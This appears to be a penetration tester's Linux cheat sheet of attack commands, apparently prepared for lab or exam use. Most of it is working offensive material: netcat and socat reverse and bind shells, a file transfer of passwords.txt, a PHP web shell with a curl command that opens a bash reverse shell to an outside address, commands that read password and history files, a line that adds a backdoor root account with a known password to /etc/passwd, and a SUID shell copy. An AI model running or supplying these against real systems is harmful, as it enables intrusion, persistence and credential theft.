# Linux 
- Important locations
  - /bin - have binaries (ls, pwd etc.)
  - /sbin - system programs (fdisk, sysctl, etc.)
  - /etc - config files
  - /tmp - temp files
  - /usr/bin - applications (nmap, etc.)
  - /usr/share - application support and data files

# File transfer
- `nc -nv 10.10.10.10 443 < nc.exe` `nc -nlvp 443 > nc.exe`
- socat `socat TCP4-LISTEN:443,fork file:passwords.txt` `socat TCP4:10.10.10.10:443 file:received.txt,create`

# Linux Shells
Run once we get shell `python -c "import pty;pty.spawn('/bin/bash')";export TERM=xterm;stty raw -echo`

- netcat(nc)
  - Reverse shell `nc -nv 10.10.10.10 443 -e /bin/bash` 
  - Bind shell `nc -nvlp 443 -e /bin/bash`
- socat
  - Reverse shell `socat TCP4:10.10.10.10:443 EXEC:/bin/bash`
  - Listener `socat -d -d TCP4-LISTEN:443 STDOUT`
  - Bind shell `socat TCP-LISTEN:443 EXEC:/bin/bash`
  - Connect `socat - TCP4:10.10.10.10:443`
  - Encrypted shell
    - Generate cert `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt;cat bind_shell.key bind_shell.crt > bind_shell.pem`
    - Bind shell `socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
    - Connect `socat - OPENSSL:10.10.10.10:443,verify=0`

- PHP reverse shell
  -  Shell `<?php echo shell_exec($_REQUEST["cmd"])?>`
  -  Run `curl -X POST hxxp://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c "bash -i >& /dev/tcp/10.10.14.4/1234 0>&1"'`

# Linux privilege escalation
- [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) for enumeration
- [GTFObins](https://gtfobins.github.io/)
- Kernal exploits [linux-exploit-suggester-2.pl](https://github.com/jondonas/linux-exploit-suggester-2)

- id; uname -a; whoami
- hostname
- `cat /etc/issue` `cat /etc/*-releas` `uname -r` `arch` 
- `cat /etc/passwd`
- `cat ~/.*history`
- `sudo -l`
- Environment variables
  - echo $PATH, $PWD, $HOME
  - `env` `printenv`
- PrivEsc with PATH `export PATH=/tmp:$PATH`
- Running process `ps aux` `ps -ef | grep root` `ps -fC apache2`
- list services `service --status-all`
- Bash history `history` `cat /home/USER/.bash_history`
- Startup enabled services `systemctl --all list-unit-files | grep enabled` `ls -l /etc/init.d/*`
- Networking info `/sbin/route` `ip a`
- Connections `ss -anp`
- Linux firewall `/etc/iptables`
- Cron jobs `ls -lah /etc/cron*` `cat /etc/crontab` `grep "CRON" /var/log/cron.log`
- Installed apps `dpkg -l`
- Writable `find / -writable -type d 2>/dev/null`
- Unmounted devices and listing other drives `cat /etc/fstab` `/bin/lsblk` `mount`
- Load drivers `lsmod` `/sbin/modinfo libata`
- SUID files `find / -perm -u=s -type f 2>/dev/null`
- Writable /etc/passwd `echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd` `su root2` password is `evil`
- Stickybit `cp /bin/sh /tmp/sh;chmod 4755 /tmp/sh;` # now `/tmp/sh -i`
